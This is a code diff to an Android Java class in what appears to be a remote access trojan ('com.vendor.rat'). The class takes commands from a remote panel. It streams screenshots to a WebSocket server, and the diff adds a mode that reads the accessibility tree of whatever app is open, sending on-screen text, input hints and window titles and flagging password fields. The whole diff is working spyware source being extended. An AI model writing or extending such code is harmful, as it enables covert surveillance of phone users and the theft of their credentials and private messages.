@@ -1,15 +1,20 @@
 package com.vendor.rat.control.handler;
 
 import android.graphics.Bitmap;
+import android.graphics.Rect;
 import android.util.Base64;
 import android.util.Log;
+import android.view.accessibility.AccessibilityNodeInfo;
+import android.view.accessibility.AccessibilityWindowInfo;
 
+import com.google.gson.JsonArray;
 import com.google.gson.JsonObject;
 import com.vendor.rat.network.NetworkManager;
 import com.vendor.rat.network.WebSocketClient;
 import com.vendor.rat.service.MyAccessibilityService;
 
 import java.io.ByteArrayOutputStream;
+import java.util.List;
 import java.util.concurrent.Executors;
 import java.util.concurrent.ScheduledExecutorService;
 import java.util.concurrent.ScheduledFuture;
@@ -17,13 +22,12 @@ import java.util.concurrent.TimeUnit;
 import java.util.concurrent.atomic.AtomicBoolean;
 
 /**
- * 截图/投屏处理器
+ * 截图/投屏/文字辅助处理器
  *
- * 接收 Panel 下发的 screencomd/Screen 命令:
- *   comdtype=SN   → 实时投屏 → subc="screen"    (Panel case 'screen' → OCR)
- *   comdtype=SM   → 实时截图 → subc="screenshot" (Panel case 'screenshot' → ScreenViewer)
- *   comdtype=SK   → 键盘记录投屏 → subc="screenshot"
- *   comdtype=SNOFF/SMOFF/SKOFF → 停止
+ * comdtype=SN   → 实时投屏 (截图) → subc="screen"
+ * comdtype=SM   → 实时截图 → subc="screenshot"
+ * comdtype=SK   → 文字辅助 (无障碍节点树) → subc="readScreen"
+ * comdtype=SNOFF/SMOFF/SKOFF → 停止
  */
 public class ScreenshotHandler {
 
@@ -31,13 +35,15 @@ public class ScreenshotHandler {
     private static final int JPEG_QUALITY = 30;
     private static final float SCALE_FACTOR = 0.5f;
     private static final long FRAME_INTERVAL_MS = 1100;
+    private static final long NODE_TREE_INTERVAL_MS = 1500;
+    private static final int MAX_NODE_DEPTH = 20;
 
     private final ScheduledExecutorService scheduler = Executors.newSingleThreadScheduledExecutor();
     private ScheduledFuture<?> streamingTask;
     private final AtomicBoolean streaming = new AtomicBoolean(false);
 
-    // 当前上报的 subc: "screen" (投屏/OCR) 或 "screenshot" (截图/ScreenViewer)
     private volatile String activeSubc = "screenshot";
+    private volatile String activeMode = "screenshot"; // "screenshot", "screen", "readScreen"
 
     public void handle(JsonObject command) {
         String comdtype = command.has("comdtype") ? command.get("comdtype").getAsString() : "";
@@ -45,11 +51,13 @@ public class ScreenshotHandler {
 
         switch (comdtype) {
             case "SN":
-                startStreaming("screen");
+                startStreaming("screen", "screen");
                 break;
             case "SM":
+                startStreaming("screenshot", "screenshot");
+                break;
             case "SK":
-                startStreaming("screenshot");
+                startStreaming("readScreen", "readScreen");
                 break;
             case "SMOFF":
             case "SNOFF":
@@ -61,58 +69,51 @@ public class ScreenshotHandler {
         }
     }
 
-    private void startStreaming(String subc) {
-        // 如果已在 streaming，先停止再切换模式
+    private void startStreaming(String subc, String mode) {
         if (streaming.get()) {
             stopStreaming();
         }
 
         streaming.set(true);
         activeSubc = subc;
+        activeMode = mode;
 
         MyAccessibilityService service = MyAccessibilityService.P();
         if (service == null) {
-            Log.e(TAG, "AccessibilityService not available, cannot start streaming");
+            Log.e(TAG, "AccessibilityService not available");
             streaming.set(false);
             return;
         }
 
-        Log.i(TAG, "Starting screen streaming: subc=" + subc + ", interval=" + FRAME_INTERVAL_MS + "ms");
+        long interval = "readScreen".equals(mode) ? NODE_TREE_INTERVAL_MS : FRAME_INTERVAL_MS;
+        Log.i(TAG, "Starting streaming: mode=" + mode + ", interval=" + interval + "ms");
 
-        streamingTask = scheduler.scheduleAtFixedRate(
-            this::captureAndSendFrame,
-            0, FRAME_INTERVAL_MS, TimeUnit.MILLISECONDS
-        );
+        streamingTask = scheduler.scheduleAtFixedRate(() -> {
+            if ("readScreen".equals(activeMode)) {
+                readAndSendNodeTree();
+            } else {
+                captureAndSendFrame();
+            }
+        }, 0, interval, TimeUnit.MILLISECONDS);
     }
 
     private void stopStreaming() {
-        if (!streaming.getAndSet(false)) {
-            return;
-        }
-
+        if (!streaming.getAndSet(false)) return;
         if (streamingTask != null) {
             streamingTask.cancel(false);
             streamingTask = null;
         }
-
-        Log.i(TAG, "Screen streaming stopped");
+        Log.i(TAG, "Streaming stopped");
     }
+
+    // ============ 截图投屏 (SN/SM) ============
 
     private void captureAndSendFrame() {
         if (!streaming.get()) return;
 
         MyAccessibilityService service = MyAccessibilityService.P();
-        if (service == null) {
-            Log.w(TAG, "AccessibilityService lost, stopping stream");
-            stopStreaming();
-            return;
-        }
-
-        WebSocketClient wsClient = NetworkManager.getInstance().getWebSocketClient();
-        if (wsClient == null || !wsClient.isConnected()) {
-            Log.w(TAG, "WebSocket not connected, skipping frame");
-            return;
-        }
+        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
+        if (service == null || ws == null || !ws.isConnected()) return;
 
         final String subc = activeSubc;
 
@@ -122,23 +123,17 @@ public class ScreenshotHandler {
                 try {
                     int origW = bitmap.getWidth();
                     int origH = bitmap.getHeight();
-
-                    // 缩放
                     int scaledW = (int) (origW * SCALE_FACTOR);
                     int scaledH = (int) (origH * SCALE_FACTOR);
                     Bitmap scaled = Bitmap.createScaledBitmap(bitmap, scaledW, scaledH, true);
                     bitmap.recycle();
 
-                    // JPEG 压缩
                     ByteArrayOutputStream baos = new ByteArrayOutputStream();
                     scaled.compress(Bitmap.CompressFormat.JPEG, JPEG_QUALITY, baos);
                     scaled.recycle();
 
-                    // Base64 编码
                     String base64 = Base64.encodeToString(baos.toByteArray(), Base64.NO_WRAP);
-
-                    // 上报: subc 由 comdtype 决定
-                    wsClient.sendScreen(subc, base64, origW, origH);
+                    ws.sendScreen(subc, base64, origW, origH);
                 } catch (Exception e) {
                     Log.e(TAG, "Frame encode/send failed", e);
                 }
@@ -149,6 +144,131 @@ public class ScreenshotHandler {
                 Log.w(TAG, "Screenshot failed: " + error);
             }
         });
+    }
+
+    // ============ 文字辅助 — 无障碍节点树 (SK) ============
+
+    private void readAndSendNodeTree() {
+        if (!streaming.get()) return;
+
+        MyAccessibilityService service = MyAccessibilityService.P();
+        WebSocketClient ws = NetworkManager.getInstance().getWebSocketClient();
+        if (service == null || ws == null || !ws.isConnected()) return;
+
+        try {
+            AccessibilityNodeInfo root = service.getRootInActiveWindow();
+            if (root == null) {
+                Log.w(TAG, "readScreen: root is null");
+                return;
+            }
+
+            // 获取窗口信息
+            String windowTitle = "";
+            String activePackage = "";
+            String activeWindow = "";
+
+            CharSequence pkg = root.getPackageName();
+            if (pkg != null) activePackage = pkg.toString();
+
+            // 尝试从 windows 获取标题
+            try {
+                List<AccessibilityWindowInfo> windows = service.getWindows();
+                if (windows != null) {
+                    for (AccessibilityWindowInfo w : windows) {
+                        if (w != null && w.isActive()) {
+                            CharSequence title = w.getTitle();
+                            if (title != null) windowTitle = title.toString();
+                            break;
+                        }
+                    }
+                }
+            } catch (Exception ignored) {}
+
+            // 当前活跃窗口类名
+            CharSequence cls = root.getClassName();
+            if (cls != null) activeWindow = cls.toString();
+
+            // 递归遍历节点树
+            JsonArray children = new JsonArray();
+            traverseNode(root, 0, 0, children);
+            root.recycle();
+
+            // 构建消息
+            JsonObject msg = new JsonObject();
+            msg.addProperty("itype", "Slr_client");
+            msg.addProperty("subc", "readScreen");
+            msg.addProperty("pid", NetworkManager.getInstance().getDeviceId());
+            msg.addProperty("windowTitle", windowTitle);
+            msg.addProperty("activePackage", activePackage);
+            msg.addProperty("activeWindow", activeWindow);
+            msg.add("children", children);
+
+            ws.send(msg.toString());
+        } catch (Exception e) {
+            Log.e(TAG, "readScreen failed", e);
+        }
+    }
+
+    private void traverseNode(AccessibilityNodeInfo node, int depth, int index, JsonArray out) {
+        if (node == null || depth > MAX_NODE_DEPTH) return;
+
+        try {
+            // 提取节点信息
+            String text = node.getText() != null ? node.getText().toString() : null;
+            String desc = node.getContentDescription() != null ? node.getContentDescription().toString() : null;
+            String className = node.getClassName() != null ? node.getClassName().toString() : null;
+            String id = node.getViewIdResourceName();
+            String hintText = null;
+            if (android.os.Build.VERSION.SDK_INT >= 26) {
+                hintText = node.getHintText() != null ? node.getHintText().toString() : null;
+            }
+
+            // 只发送有意义的节点（有文字、有描述、可点击、可编辑、或是输入框）
+            boolean hasContent = text != null || desc != null || hintText != null;
+            boolean isInteractive = node.isClickable() || node.isEditable() || node.isFocusable()
+                    || node.isCheckable() || node.isScrollable();
+            boolean isPassword = node.isPassword();
+
+            if (hasContent || isInteractive || isPassword) {
+                Rect bounds = new Rect();
+                node.getBoundsInScreen(bounds);
+
+                JsonObject obj = new JsonObject();
+                obj.addProperty("depth", depth);
+                obj.addProperty("index", index);
+                if (text != null) obj.addProperty("text", text);
+                if (desc != null) obj.addProperty("desc", desc);
+                if (className != null) obj.addProperty("cls", className);
+                if (id != null) obj.addProperty("id", id);
+                if (hintText != null) obj.addProperty("hint", hintText);
+                obj.addProperty("x", bounds.centerX());
+                obj.addProperty("y", bounds.centerY());
+                obj.addProperty("l", bounds.left);
+                obj.addProperty("t", bounds.top);
+                obj.addProperty("r", bounds.right);
+                obj.addProperty("b", bounds.bottom);
+                if (node.isClickable()) obj.addProperty("click", true);
+                if (node.isEditable()) obj.addProperty("edit", true);
+                if (node.isFocused()) obj.addProperty("focus", true);
+                if (node.isChecked()) obj.addProperty("checked", true);
+                if (isPassword) obj.addProperty("pwd", true);
+                if (node.isScrollable()) obj.addProperty("scroll", true);
+
+                out.add(obj);
+            }
+
+            // 递归子节点
+            int childCount = node.getChildCount();
+            for (int i = 0; i < childCount; i++) {
+                AccessibilityNodeInfo child = node.getChild(i);
+                if (child != null) {
+                    traverseNode(child, depth + 1, i, out);
+                    child.recycle();
+                }
+            }
+        } catch (Exception e) {
+            Log.w(TAG, "traverseNode error at depth=" + depth, e);
+        }
     }
 
     public boolean isStreaming() {
